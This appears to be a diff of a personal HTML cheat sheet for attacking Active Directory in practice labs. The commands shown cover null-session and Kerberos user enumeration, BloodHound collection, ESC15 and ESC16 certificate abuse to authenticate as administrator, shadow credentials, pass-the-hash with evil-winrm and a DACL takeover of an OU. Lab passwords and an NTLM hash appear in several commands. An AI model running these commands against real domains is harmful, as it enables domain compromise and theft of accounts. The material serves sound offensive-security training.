@@ -34,17 +34,21 @@
 
 
                 <h3>Rpcclient</h3>
-                <p>Null sesion with rpcclient in order to enumerate users</p>
-                <pre><code class="language-bash">rpcclient -U "" 10.10.11.51 -N</code></pre>
-                <p>Once inside, user enumeration</p>
-                <pre><code class="language-bash">enumdomusers</code></pre>
+                <ul>
+                    <p>Null sesion with rpcclient in order to enumerate users</p>
+                    <pre><code class="language-bash">rpcclient -U "" 10.10.11.51 -N</code></pre>
+                    <p>Once inside, user enumeration</p>
+                    <pre><code class="language-bash">enumdomusers</code></pre>
+                </ul>
 
 
                 <h3> Kerbrute </h3>
+                <ul>
                 <p>User enumeration</p>
                 <pre><code class="language-bash">kerbrute userenum --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/usernames.txt </code></pre>
-
+                </ul>
                 <h3> BloodHound </h3>
+                <ul>
                 <p> Utility to gather more information when a <b>user and password have been gathered</b></p>
                 <pre><code class="language-bash">bloodhound-python --dns-tcp -ns TARGET_IP -d DOMAIN -u 'USER' -p 'PASS' -c all</code></pre>
                 
@@ -59,6 +63,18 @@
                 <p> Ej: Object ID:S-1-5-21-1677581083-3380853377-188903654-<b>1103</b></p>
 
                 <p> In case you see permision <b>"(GenericAll/GenericWrite/WriteDacl/WriteProperty/etc)"</b> in a group that is not default it may be suspicious. It that case click on it and follow the commands it says</p>
+                </ul>
+                <h3> Basic AD commands </h3>
+                <ul>
+                <p>Show all users in the AD</p>
+                <pre><code class="language-powershell">Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties SamAccountName, LastKnownParent |
+Select-Object Name, SamAccountName, LastKnownParent</code></pre>
+                <p>Restore the user based on the GUID. Previously you need to find a command to show thr GUID of certain user</p>
+<pre><code class="language-powershell">$guid = [guid]"938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
+Restore-ADObject -Identity $guid</code></pre>
+                </ul>
+                
+                
             </ul>
             <h2>Exploitation</h2>
             <ul>
@@ -120,6 +136,16 @@ $Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $Sec
                     <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
                 </ul>
 
+                <h3>Active Directory Certificate Services (ADCS) | Arbitrary Application Policy Injection in V1 Templates ESC15 </h3>
+                <ul>
+                    <p>In this case the user you control has permisions over a Certificate Template. That way, using certipy we modify the template to asdd authentication and enrollment to a account we control</p>
+                    <pre><code class="language-bash">certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'mypassword' -dc-ip '10.10.11.72' -target-ip 10.10.11.72 -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'</code></pre>   
+                    <p>Now using the .pfx file login as the admin.</p>
+                    <pre><code class="language-bash">certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell</code></pre>
+                    <p>Remember that inside you won't find a normal shell so we used permisions to add a user to the domain admins group</p>
+                    <pre><code class="language-bash">add_user_to_group john 'Domain Admins'</code></pre>   
+                </ul>
+
                 <h3>Active Directory Certificate Services (ADCS) | Security Extension Disabled on CA (Globally) ESC16 </h3>
                 <ul>
                     <p>Having in mind that CA itself it is configured to disable the inclusion of the szOID_NTDS_CA_SECURITY_EXT securty extension in all certificates it issues </p>
@@ -176,6 +202,12 @@ $Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $Sec
                 <ul>
                     <p>Used to escalate privielges. This attack is based on modifying certain attributes of the an AD object to inject a public key in the attribute "msDS-KeyCredentialLink" and then the attacker uses the private key to authenticate as he was the victim. Obtaining a NTLM hash which can be use in pass-the-hass attacks</p>
                     <pre><code class="language-bash">certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'</code></pre>
+                </ul>
+
+                <h3>Generic Descendent Object Takeover</h3>
+                <ul>
+                    <p>In case you found that you have <b>GenricAll</b> permision over an OU you could perform an object Takeover which grants you the control of all the objects inside the OU</p>
+                    <pre><code class="language-bash">dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'mypassword'</code></pre>
                 </ul>
                 
                 
